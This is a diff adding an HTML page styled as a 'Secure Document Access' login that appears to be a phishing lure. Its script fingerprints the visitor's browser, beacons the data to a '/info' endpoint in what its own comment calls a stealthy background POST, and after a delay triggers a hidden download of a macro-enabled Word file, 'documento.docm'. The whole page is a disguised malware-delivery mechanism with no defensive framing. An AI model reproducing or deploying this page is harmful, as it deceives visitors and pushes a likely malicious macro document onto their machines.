@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Document Viewer</title>
+    <style>
+        body {
+            background-color: #f4f6f9;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 60px;
+        }
+        .login-box {
+            display: inline-block;
+            padding: 30px;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+        input {
+            display: block;
+            width: 250px;
+            margin: 10px auto;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+        button {
+            background-color: #007bff;
+            color: white;
+            padding: 10px 25px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .spinner {
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <h2>Secure Document Access</h2>
+    <div class="login-box">
+        <p>Please confirm your identity before accessing the document</p>
+        <input type="text" placeholder="Username" disabled>
+        <input type="password" placeholder="Password" disabled>
+        <button disabled>Log In</button>
+        <div class="spinner">
+            <img src="https://i.gifer.com/ZZ5H.gif" width="50" alt="Loading...">
+            <p>Loading your document...</p>
+        </div>
+    </div>
+
+    <script>
+        // Collect minimal browser data
+        const datos = {
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+            screen: {
+                width: screen.width,
+                height: screen.height
+            }
+        };
+
+        // Use sendBeacon for stealthy background POST
+        const blob = new Blob([JSON.stringify(datos)], { type : 'application/json' });
+        navigator.sendBeacon("/info", blob);
+
+        // Trigger hidden download after a short delay
+        setTimeout(() => {
+            const a = document.createElement("a");
+            a.href = "/archivo.docm";
+            a.download = "documento.docm";
+            a.style.display = "none";
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }, 3000);
+    </script>
+
+</body>
+</html>
